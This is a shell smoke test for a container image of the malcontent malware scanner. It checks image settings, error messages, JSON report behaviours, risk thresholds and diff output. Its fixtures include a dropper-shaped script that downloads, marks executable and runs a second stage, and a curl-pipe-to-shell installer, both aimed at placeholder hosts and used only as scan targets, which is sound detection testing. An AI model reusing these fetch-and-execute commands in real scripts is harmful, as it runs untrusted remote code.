#!/bin/sh
set -eu

image=${1:?usage: test.sh IMAGE}
here=$(CDPATH='' cd -- "$(dirname -- "$0")" && pwd)
work=$(mktemp -d)

cleanup() {
  rm -rf "$work"
}
trap cleanup EXIT INT TERM

fail() {
  printf 'FAIL: %s\n' "$1" >&2
  exit 1
}

recipe_value() {
  awk -v key="$1" '$1 == key { gsub(/"/, "", $2); print $2; exit }' "$here/../melange.yaml"
}
expected_version=$(recipe_value version:)
commit=$(recipe_value source-commit:)
[ -n "$expected_version" ] || fail 'could not read the recipe version'
[ -n "$commit" ] || fail 'could not read the recipe source commit'

test "$(docker image inspect --format '{{.Config.User}}' "$image")" = 65532 ||
  fail 'unexpected OCI user'
test "$(docker image inspect --format '{{json .Config.Entrypoint}}' "$image")" = \
  '["/usr/bin/mal"]' || fail 'unexpected entrypoint'
test "$(docker image inspect --format '{{json .Config.Cmd}}' "$image")" = null ||
  fail 'unexpected default command'
test "$(docker image inspect --format '{{.Config.WorkingDir}}' "$image")" = /work ||
  fail 'unexpected working directory'

# Benign fixtures, never executed: a dropper-shaped script that fetches,
# marks executable and runs a second stage; a curl-pipe-to-shell installer; a
# shell script that only echoes; and a plain text note.
mkdir -p "$work/samples"
cat >"$work/samples/fetch.sh" <<'EOF'
#!/bin/sh
curl -fsSL http://example.invalid/stage2.sh -o /tmp/stage2.sh
chmod +x /tmp/stage2.sh
/tmp/stage2.sh
EOF
cat >"$work/samples/pipe.sh" <<'EOF'
#!/bin/sh
curl -fsSL http://203.0.113.7/install.sh | sh
EOF
cat >"$work/samples/hello.sh" <<'EOF'
#!/bin/sh
echo "hello"
EOF
printf 'just some notes\n' >"$work/samples/notes.txt"
chmod 0777 "$work"
chmod 0755 "$work/samples"
chmod 0644 "$work/samples/"*

mal() {
  docker run --rm --network none --read-only --tmpfs /tmp --cap-drop ALL \
    -v "$work:/work" -w /work/samples "$image" "$@"
}

mal --version >"$work/version" 2>&1 || fail 'mal --version failed'
grep -Fx "malcontent version v$expected_version" "$work/version" >/dev/null ||
  fail "mal --version does not report $expected_version: $(cat "$work/version")"

# Negative: usage errors exit non-zero with a diagnostic.
rc=0
mal --definitely-invalid analyze fetch.sh >"$work/invalid" 2>&1 || rc=$?
[ "$rc" -ne 0 ] || fail 'invalid flag unexpectedly succeeded'
grep -F 'flag provided but not defined: -definitely-invalid' "$work/invalid" >/dev/null ||
  fail "invalid flag diagnostic is missing: $(cat "$work/invalid")"
rc=0
mal --format bogus analyze fetch.sh >"$work/format" 2>&1 || rc=$?
[ "$rc" -ne 0 ] || fail 'unknown output format unexpectedly succeeded'
grep -F 'unknown renderer: "bogus"' "$work/format" >/dev/null ||
  fail "unknown format diagnostic is missing: $(cat "$work/format")"
rc=0
mal --format json analyze missing.sh >"$work/missing" 2>&1 || rc=$?
[ "$rc" -ne 0 ] || fail 'scan of a missing path unexpectedly succeeded'
grep -F 'scan path "missing.sh": file does not exist' "$work/missing" >/dev/null ||
  fail "missing path diagnostic is missing: $(cat "$work/missing")"

# Directory analysis written with --output into the mounted volume. The report
# is pre-created world-writable so the host can read what UID 65532 writes.
report=$work/report.json
: >"$report"
chmod 0666 "$report"
mal --format json --min-risk any --output /work/report.json analyze . >"$work/analyze" 2>&1 ||
  fail "directory analysis failed: $(cat "$work/analyze")"
[ -s "$report" ] || fail 'analysis report was not written'

has_ids() {
  file=$1
  shift
  for id in "$@"; do
    jq -e --arg f "$file" --arg id "$id" \
      '.Files[$f].Behaviors | any(.ID == $id)' "$report" >/dev/null ||
      fail "$file is missing behavior $id: $(jq -c --arg f "$file" '[.Files[$f].Behaviors[]?.ID]' "$report")"
  done
}

has_ids fetch.sh c2/tool_transfer/download net/download/fetch exec/shell/exec \
  fs/file/make_executable fs/path/tmp net/url/embedded
jq -e '.Files["fetch.sh"].RiskLevel == "MEDIUM"
  and (.Files["fetch.sh"].Behaviors | any(.ID == "net/download/fetch" and .RuleName == "curl_value"))' \
  "$report" >/dev/null || fail "fetch.sh risk or rule name is unexpected: $(jq -c '.Files["fetch.sh"]' "$report")"
# Rule links point at the rules of the stamped source commit.
jq -e --arg c "$commit" '.Files["fetch.sh"].Behaviors | all(.RuleURL | contains($c))' \
  "$report" >/dev/null || fail "rule URLs do not reference $commit: $(jq -c '[.Files["fetch.sh"].Behaviors[].RuleURL]' "$report")"
has_ids pipe.sh exec/shell/pipe_sh c2/tool_transfer/shell net/download/fetch

# Negative: the echo-only script triggers nothing beyond running a shell, and
# the text note is skipped as a non-program file.
jq -e '[.Files["hello.sh"].Behaviors[].ID] == ["exec/shell/exec"]' "$report" >/dev/null ||
  fail "hello.sh behaviors are unexpected: $(jq -c '[.Files["hello.sh"].Behaviors[]?.ID]' "$report")"
jq -e '.Files | has("notes.txt") | not' "$report" >/dev/null ||
  fail 'notes.txt was unexpectedly reported'
test "$(jq -c '.Files | keys' "$report")" = '["fetch.sh","hello.sh","pipe.sh"]' ||
  fail "unexpected reported files: $(jq -c '.Files | keys' "$report")"

# Negative: no finding reaches HIGH, so a high threshold reports nothing.
mal --format json --min-risk high analyze fetch.sh >"$work/high" 2>&1 ||
  fail "high-threshold analysis failed: $(cat "$work/high")"
jq -e '(.Files // {}) | length == 0' "$work/high" >/dev/null ||
  fail "high threshold unexpectedly reported findings: $(cat "$work/high")"

# Category filter keeps only net/ behaviors.
mal --format json --min-risk any --rule-category net analyze fetch.sh >"$work/net" 2>&1 ||
  fail "category-filtered analysis failed: $(cat "$work/net")"
jq -e '[.Files["fetch.sh"].Behaviors[].ID] | length > 0 and all(startswith("net/"))
  and any(. == "net/download/fetch")' "$work/net" >/dev/null ||
  fail "category filter is unexpected: $(cat "$work/net")"

# --exit-first-hit exits 1 on a match and 0 on a file with no findings.
rc=0
mal --format json --exit-first-hit analyze fetch.sh >"$work/hit" 2>&1 || rc=$?
[ "$rc" -eq 1 ] || fail "--exit-first-hit on fetch.sh exited $rc: $(cat "$work/hit")"
grep -F 'fetch.sh matched exit criteria' "$work/hit" >/dev/null ||
  fail "--exit-first-hit diagnostic is missing: $(cat "$work/hit")"
mal --format json --exit-first-hit analyze notes.txt >"$work/nohit" 2>&1 ||
  fail "--exit-first-hit on notes.txt failed: $(cat "$work/nohit")"

# Diff: behaviors added from hello.sh to fetch.sh, without the shared shell one.
mal --format json diff hello.sh fetch.sh >"$work/diff" 2>"$work/diff.err" ||
  fail "diff failed: $(cat "$work/diff.err")"
jq -e '[.Diff.Modified[] | select(.Path == "fetch.sh") | .Behaviors[]
    | select(.DiffAdded == true) | .ID] as $added
  | ($added | any(. == "net/download/fetch"))
  and ($added | any(. == "c2/tool_transfer/download"))
  and ($added | all(. != "exec/shell/exec"))' "$work/diff" >/dev/null ||
  fail "diff output is unexpected: $(cat "$work/diff")"

printf 'SMOKE PASS image=%s version=%s\n' "$image" "$expected_version"
